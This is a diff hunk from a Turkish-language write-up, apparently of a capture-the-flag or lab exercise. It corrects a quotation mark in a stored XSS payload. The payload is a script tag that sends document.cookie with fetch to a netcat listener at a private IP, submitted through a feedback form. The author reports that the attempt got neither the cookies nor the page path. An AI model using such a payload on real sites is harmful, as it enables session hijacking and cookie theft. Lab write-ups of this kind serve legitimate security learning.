@@ -24,7 +24,7 @@ Nasıl çalıştığını anlamak için rastgele bir şeyler yazdım ve gönderd
 Daha sonra XSS açığının olup olmadığını kontrol etmek için netcat ile 8080 portunu dinlemeye aldım ve aşağıdaki javascript kodunu geri bildirim sayfasıyla gönderdim.
 
 ```js
-<script>fetch(‘http://10.21.66.61:8080/?=' + document.cookie)</script>
+<script>fetch('http://10.21.66.61:8080/?=' + document.cookie)</script>
 ```
 
 Bildirimlerin okunduğu sayfada XSS zafiyeti bulunuyorsa eğer bu javascript kodu ile hem bildirimlerin okunduğu sayfanın yolunu öğrenebilir hem de cookie bilgilerini alabilirdik. Ancak iki bilgiyide elde edemiyoruz.
